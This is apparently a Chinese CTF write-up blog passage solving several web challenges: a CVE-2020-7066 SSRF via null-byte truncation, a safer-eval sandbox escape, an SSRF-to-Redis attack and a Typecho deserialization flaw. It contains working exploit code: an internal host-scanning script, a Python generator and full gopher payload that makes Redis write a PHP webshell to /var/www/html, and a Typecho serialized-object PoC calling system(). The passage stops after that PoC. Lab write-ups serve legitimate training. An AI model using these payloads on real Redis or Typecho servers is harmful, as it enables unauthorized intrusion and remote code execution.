data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051548419.png" alt="image-20230405154814376"></p><p>然后去读 flag.hint 就可以了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051549681.png" alt="image-20230405154912635"></p><h3 id="cve版签到"><a class="anchor" href="#cve版签到">#</a> cve 版签到</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051554551.png" alt="image-20230405155402510"></p><p>cve 编号有了，看来简单复现一下就行 [<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vS3kxMjI2L3AvMTQzMzIxMTAuaHRtbA==">代码审计] CVE-2020-7066 漏洞复现 - Ky1226 - 博客园 (cnblogs.com)</span></p><p>简答来说 get_headers () 会截断 URL 中空字符后的内容</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051558787.png" alt="image-20230405155808748"></p><p>点击后多了一个 url</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051557371.png" alt="image-20230405155759326"></p><p>看起来是 SSRF，通过 %00 截断然后访问本地 ip</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051608881.png" alt="image-20230405160815831"></p><p>要以 123 结尾</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051608003.png" alt="image-20230405160845950"></p><h3 id="ez三剑客-eznode"><a class="anchor" href="#ez三剑客-eznode">#</a> EZ 三剑客 - EzNode</h3><p>看到首页</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051614492.png" alt="image-20230405161417448"></p><p>版本</p><pre><code class="language-perl">&#123;
  &quot;name&quot;: &quot;src&quot;,
  &quot;version&quot;: &quot;1.0.0&quot;,
  &quot;main&quot;: &quot;index.js&quot;,
  &quot;license&quot;: &quot;MIT&quot;,
  &quot;dependencies&quot;: &#123;
    &quot;body-parser&quot;: &quot;1.19.0&quot;,
    &quot;express&quot;: &quot;4.17.1&quot;,
    &quot;safer-eval&quot;: &quot;1.3.6&quot;
  &#125;
&#125;
</code></pre><p>源码</p><figure class="highlight js"><figcaption data-lang="JavaScript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">const</span> saferEval <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'safer-eval'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2019.7/WORKER1 找到一个很棒的库</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// 2020.1/WORKER2 老板说为了后期方便优化</span></pre></td></tr><tr><td data-num="15"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>path <span class="token operator">===</span> <span class="token string">'/eval'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">let</span> delay <span class="token operator">=</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>delay<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Number<span class="token punctuation">.</span><span class="token function">isInteger</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>delay<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>      delay <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>delay<span class="token punctuation">,</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>delay<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">const</span> t <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我 p 事</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>      <span class="token function">clearTimeout</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'timeout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Timeout!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/eval'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>  <span class="token keyword">let</span> response <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>      response <span class="token operator">=</span> <span class="token function">saferEval</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>      response <span class="token operator">=</span> <span class="token string">'Wrong Wrong Wrong!!!!'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算 KPI</span></pre></td></tr><tr><td data-num="51"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>  res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/javascript;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./index.js'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token comment">// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口</span></pre></td></tr><tr><td data-num="57"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/version'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>  res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/json;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./package.json'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>  res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre></pre></td></tr><tr><td data-num="67"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Start listening'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="69"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>后面的部分都在首页面给出了，题目的核心在两个 eval 路由上，先看第一个</p><figure class="highlight js"><figcaption data-lang="JavaScript"></figcaption><table><tr><td data-num="1"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token comment">// 如果请求路径为 '/eval'</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>path <span class="token operator">===</span> <span class="token string">'/eval'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment">// 设置延迟时间为 60 秒</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">let</span> delay <span class="token operator">=</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>delay<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">// 如果请求参数中有 delay 参数，则将延迟时间设置为 delay 参数的值和当前延迟时间的最大值</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Number<span class="token punctuation">.</span><span class="token function">isInteger</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>delay<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>      delay <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>delay<span class="token punctuation">,</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>delay<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token comment">// 设置一个定时器，延迟时间到期后执行 next () 函数</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">const</span> t <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我 p 事</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token comment">// 如果延迟时间过长，设置一个 1 秒的定时器，到期后清除之前设置的定时器，并返回 'Timeout!' 字符串</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>      <span class="token function">clearTimeout</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'timeout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Timeout!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token comment">// 如果请求路径不为 '/eval'，则执行 next () 函数</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>简答来说就是通过 <code>/eval?delay=</code> 上传一个数字并和 60000 比较，大的赋值给 delay</p><pre><code class="language-perl">浏览器内部使用32位带符号的整数来储存推迟执行的时间这意味着setTimeout最多延迟2147483647秒（24.8天）。只要大于2147483647,就会发生溢出
</code></pre><p>根据版本找到一个 cve<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NvbW1lbnRob2wvc2FmZXItZXZhbC9pc3N1ZXMvMTA=">Breakout · Issue #10 · commenthol/safer-eval (github.com)</span>，直接用就行</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051628984.png" alt="image-20230405162804912"></p><h3 id="ez三剑客-ezweb"><a class="anchor" href="#ez三剑客-ezweb">#</a> EZ 三剑客 - EzWeb</h3><p>看源码有一个 get 传参</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051629938.png" alt="image-20230405162919887"></p><p>访问</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051629926.png" alt="image-20230405162928878"></p><p>给了网卡信息，<span class="exturl" data-url="aHR0cDovL3huLS13d3ctMHYxZWw1YmM3cGkwMmIwNzBkLmJhaWR1LmNvbQ==">在前段输入 www.baidu.com</span>, 可以访问到这个页面。又是一个 ssrf</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051630056.png" alt="image-20230405163052975"></p><p>不让访问 127.0.0.1 但是可以使用真实 ip</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051636213.png" alt="image-20230405163646133"></p><p>尝试使用 file 读文件 file 协议被过滤了，尝试通过 file:/ 或者 file: // 去绕过</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051641155.png" alt="image-20230405164131078"></p><pre><code class="language-php">&lt;?php
function curl($url)&#123;  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    echo curl_exec($ch);
    curl_close($ch);
&#125;

if(isset($_GET['submit']))&#123;
		$url = $_GET['url'];
		//echo $url.&quot;\n&quot;;
		if(preg_match('/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is', $url,$match))
		&#123;
			//var_dump($match);
			die('别这样');
		&#125;
		curl($url);
&#125;
if(isset($_GET['secret']))&#123;
	system('ifconfig');
&#125;
?&gt;
</code></pre><p>过滤了 file://、dict、127.0.0.1、localhost，还能使用 gopher 协议和 http 协议</p><p>先使用 http 服务探测存活主机，这里用 burp 的探测会卡住，简单的用 python 判断</p><pre><code class="language-python">import requests
import time

url = &quot;http://d3edfd3a-f06a-42ad-9bf4-fb994618272a.node4.buuoj.cn:81/index.php&quot;
for i in range(255):
	getdata = &quot;?url=http://10.244.80.&quot;+str(i)+&quot;&amp;submit=%E6%8F%90%E4%BA%A4&quot;
	urs_l = url + getdata
	# print(urs_l)
	try:
		re = requests.get(urs_l,timeout=1)
		print(re)
	except requests.exceptions.RequestException:
		print(&quot;失败   &quot;+str(i))
		pass

	time.sleep(1)
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051720575.png" alt="image-20230405172033524"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051720183.png" alt="image-20230405172015095"></p><p>接着扫描端口，6379 端口是开放的，有 redis 服务，gopher 打 ssrf，redis 的未授权访问漏洞，这里贴一下网上找到的 python2 的脚本这里改一下用 python3 跑</p><pre><code class="language-python"># 导入 quote 函数
from urllib.parse import quote

# 定义协议、IP、端口、要写入的 PHP 代码、文件名、路径、密码、命令列表
protocol = &quot;gopher://&quot;
ip = &quot;10.244.80.203&quot;
port = &quot;6379&quot;
shell = &quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;
filename = &quot;1.php&quot;
path = &quot;/var/www/html&quot;
passwd = &quot;&quot;
cmd = [&quot;flushall&quot;,  # 清空 Redis 数据库
       &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;, &quot;$&#123;IFS&#125;&quot;)),  # 将 PHP 代码写入 Redis 中
       &quot;config set dir &#123;&#125;&quot;.format(path),  # 设置 Redis 工作目录
       &quot;config set dbfilename &#123;&#125;&quot;.format(filename),  # 设置 Redis 数据库文件名
       &quot;save&quot;  # 将 Redis 数据库保存到磁盘中
       ]

# 如果设置了密码，将 AUTH 命令添加到命令列表中
if passwd:
    cmd.insert(0, &quot;AUTH &#123;&#125;&quot;.format(passwd))

# 拼接 payload
payload = protocol + ip + &quot;:&quot; + port + &quot;/_&quot;

# 定义 redis_format 函数，将命令转换为 Redis 格式
def redis_format(arr):
    CRLF = &quot;\r\n&quot;
    redis_arr = arr.split(&quot; &quot;)
    cmd = &quot;&quot;
    cmd += &quot;*&quot; + str(len(redis_arr))
    for x in redis_arr:
        cmd += CRLF + &quot;$&quot; + str(len((x.replace(&quot;$&#123;IFS&#125;&quot;, &quot; &quot;)))) + CRLF + x.replace(&quot;$&#123;IFS&#125;&quot;, &quot; &quot;)
    cmd += CRLF
    return cmd

# 将每个命令转换为 Redis 格式，并拼接到 payload 中
if __name__ == &quot;__main__&quot;:
    for x in cmd:
        payload += quote(redis_format(x))
    print(payload)
#gopher://10.244.80.203:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%245%0D%0A1.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
</code></pre><p>访问木马文件就能拿到 flag</p><h3 id="ez三剑客-eztypecho"><a class="anchor" href="#ez三剑客-eztypecho">#</a> EZ 三剑客 - EzTypecho</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051750723.png" alt="image-20230405175019643"></p><p>直接去找 Typecho 的 cve，看到是有反序列化漏洞的<span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzQyNC8jMHgwMQ=="> Typecho 前台 getshell 漏洞分析 (seebug.org)</span></p><p>这个直接用网上的 poc 打就行</p><pre><code class="language-php">&lt;?php
class Typecho_Request
&#123;
    private $_params = array();
    private $_filter = array();

    public function __construct()
    &#123;
        $this-&gt;_params['screenName'] = 'ls /';
        //$this-&gt;_params['screenName'] = -1;
        $this-&gt;_filter[0] = 'system';
    &#125;
&#125;

class Typecho_Feed
&#123;
    const RSS2 = 'RSS 2.0';
    /** 定义ATOM 1.0类型 */
    const ATOM1 = 'ATOM 1.0';
    /** 定义RSS时间格式 */
    const DATE_RFC822 = 'r';
    /** 定义ATOM时间格式 */
    const DATE_W3CDTF = 'c';
    /** 定义行结束符 */
    const EOL = &quot;\n&quot;;
    private $_type;
    private $_items = array();
    public $dateFormat;

    public function __construct()
    &#123;
        $this-&gt;_type = self::RSS2;
        $item['link'] = '1';
        $item['title'] = '2';
        $item['date'] = 1507720298;
        $item['author'] = new Typecho_Request();
        $item['category'] = array(new Typecho_Request());

        $this-&gt;_items[0] = $item;
    &#125;
&#125;

$x = new Typecho_Feed();
$a = array(
    'host' =&gt; 'localhost',
    'user' =&gt; 'xxxxxx',
    'charset' =&gt; 'utf8',
    'port' =&gt; '3306',
    'database' =&gt; 'typecho',
    'adapter' =&gt; $x,
    'prefix' =&gt; 'typecho_'
);
echo urlencode(base64_encode(serialize($a)));
?&gt;
